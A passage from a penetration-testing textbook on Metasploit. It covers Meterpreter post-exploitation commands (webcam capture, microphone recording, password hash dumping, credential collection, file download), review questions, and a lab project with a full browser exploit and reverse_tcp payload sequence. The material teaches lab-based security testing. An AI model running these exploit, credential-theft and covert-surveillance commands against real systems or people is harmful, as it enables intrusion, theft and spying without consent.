
![](img/fa54c6d61c14db5421f8f63e6d594bb5_330_0.png)

FIGURE 13-25 Discovering Running Processes with run ps.

But these are not guaranteed to work. By this point in this book you should realize that nothing is really guaranteed. You may also want to try and spy on the target machine with Metasploit:

```
webcam_list
```

Then pick the camera and type:

```
webcam_snap
```

If you get tired of taking pictures with the target machine’s webcam, then use the microphone to record:

```
record_mic
```

The record_mic is shown in Figure 13-26.

![](img/fa54c6d61c14db5421f8f63e6d594bb5_330_1.png)

FIGURE 13-26 Recording with the Microphone Using record_mic.

The webcam_snap is one I frequently use in real penetration tests. This causes absolutely no harm to the target machine, and will illustrate the need for better security. In fact, many people find it unnerving when your penetration testing report includes a picture of them at their desk. Usually, after they get over the initial uneasiness, they take security much more seriously after that.

There are also several other post exploits you can try. Of course, nothing is guaranteed to work, but you may want to try these:

- **run post/windows/gather/usb_history:** This will get all USB devices that have been connected to the machine.
- **run post/windows/gather/hashdump:** This will dump the hashes of the Windows passwords. You can then run those through rainbow tables.
- **run post/multi/recon/local_exploit_suggester:** This one is rather obvious.
- **use post/windows/gather/enum_patches:** Find out what patches are on this machine. That will let you know what else might work, and what won’t.
- **run post/windows/gather/credentials/credential_collector:** This will attempt to grab local credentials.

## Summary

This chapter covered the essentials of Metasploit. After completing this chapter, as well as the projects at the end, you will have a working knowledge of Metasploit. Obviously, a single chapter won’t make you an expert with Metasploit. In fact, entire books have been written on Metasploit, and none of them cover everything. But if you take the time to carefully study the material in this chapter, and really master it, you will have a strong working knowledge. There are plenty of resources on the web to help you learn specific exploits and techniques. Our goal is to get you a basic working knowledge.

## Test Your Skills

### MULTIPLE CHOICE QUESTIONS

1. The current version of Metasploit was written in what language?
   A. Python
   B. Perl
   C. Ruby
   D. C++

2. How do you see what settings a given exploit has?
   A. show options
   B. show settings
   C. show exploits
   D. show parameters

3. You have completed an exploit and wish to try another. What command will get you out of the current exploit?
   A. exit
   B. end
   C. exit -e
   D. back

4. Which of the following will attempt privilege escalation with Metasploit?
   A. getsystem
   B. getadmin
   C. migrate
   D. elevate

5. Once you have gained a session with the target, what is the term for the exploits executed on the target?
   A. Meterpreter
   B. Payloads
   C. Attacks
   D. Post exploits

## PROJECTS

### PROJECT 1: Metasploit Scan

First set up a target Windows computer. For this project it can be any version of Windows. If you wish, you can turn on FTP or install SQL Server on that target. Then attempt each of the scans in this chapter.

### PROJECT 2: Basic Metasploit

First set up a target Windows 7 computer, preferably one without service pack 1. Then attempt the first exploit in this chapter:

```
use exploit/windows/browser/ms11_003_ie_css_import
set payload windows/meterpreter/reverse_tcp
set URIPATH /clickhere
set LHOST 10.0.2.20
exploit
```

Once you are in, try the basic post exploits:

```
sysinfo
getuid
shell
```

Then exit the shell, and try a few post exploits:

```
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
```

Now back out of this exploit, kill any jobs, and repeat with another of the exploits in this chapter.

### PROJECT 3: Find Your Own

Search the Rapid7 Exploit Database and find another exploit you think will work on your target. It is best to find three or four, because the first you try will probably not work. But attempt to get a new exploit to work.

## More with Metasploit

### Chapter Objectives

After reading this chapter and completing the exercises, you will be able to do the following:

- Perform additional post-exploit commands
- Use msfvenom
- Use new Metasploit exploits

In Chapter 13, “Introduction to Metasploit,” you learned how to use the basics of Metasploit. You should make certain that you fully mastered those techniques before proceeding to this chapter. In this chapter you will add to your existing Metasploit skillset.

### Meterpreter and Post Exploits

Because this section deals with post exploits, you will first need a successful exploit. For this purpose, I used the exploit/windows/browser/ms11_003_ie_css_import exploit from Chapter 13 against a Windows 7 computer. You can use any exploit you wish; just ensure you have a successful session before attempting any of the post exploits.

### ARP

In Chapter 13, we explored several methods of getting information about the target computer, once a session was established. One interesting piece of information is from the arp command, shown in Figure 14-1.

![](img/fa54c6d61c14db5421f8f63e6d594bb5_335_0.png)

FIGURE 14-1 ARP.

This tells you IP addresses and MAC addresses associated with the target computer. This information will be useful for later attempts to pivot to other machines on the target network.

### NETSTAT

netstat is a common command for discovering network connections on a given machine as demonstrated in Figure 14-2.

![](img/fa54c6d61c14db5421f8f63e6d594bb5_335_1.png)

FIGURE 14-2 Netstat.

Again, this can show you nearby computers. It will also show you your own Kali machine connected to the target. More importantly, you may see if the machine you just exploited is currently communicating to some security device like a SIEM or IDS.

### PS

Running the ps command will show you the running processes on the target machine. This will provide you with process IDs so you can attempt to migrate to those processes. It can also show you running security services that might have detected your intrusion. Figure 14-3 illustrates use of the ps command.

![](img/fa54c6d61c14db5421f8f63e6d594bb5_336_0.png)

FIGURE 14-3 ps.

### Navigation

The normal Linux navigation commands are also available to you. One of the first steps is to run ls to see what is in the folder to which you are connected. Then you may wish to change folders. Figure 14-4 shows both steps.

### Download and Upload

Once you have navigated to a given directory, you can download or upload anything you wish. In my opinion, this is one of the most powerful aspects of Metasploit. From a penetration testing point of view, simply uploading a JPG or txt file to the desktop can prove you were there. From a malicious attacker point of view, the attacker can take any file he or she wishes, and upload any sort of software they want. In Figure 14-5, I have navigated to the Documents folder on the target machine and downloaded a file named secretstuff.txt.

Obviously, in this demo there is nothing really secret in the file secretstuff.txt, but you can see how trivial it is to navigate the target machine and to take any file you wish. It is just as easy to upload anything you wish.

![](img/fa54c6d61c14db5421f8f63e6d594bb5_337_0.png)

FIGURE 14-4 ls and cd.

![](img/fa54c6d61c14db5421f8f63e6d594bb5_337_1.png)

FIGURE 14-5 Downloading a File.

### Desktops

You can interact with the target desktop quite easily. The first step is to determine how many desktops that target has. That may seem like an odd question, but if it is a multiuser system, then each user will have a desktop. You enumerate the desktops with:

```
enumdesktops
```

This is followed with the command

```
getdesktop
```

followed by the number of the desktops you wish to interact with, as illustrated in Figure 14-6.
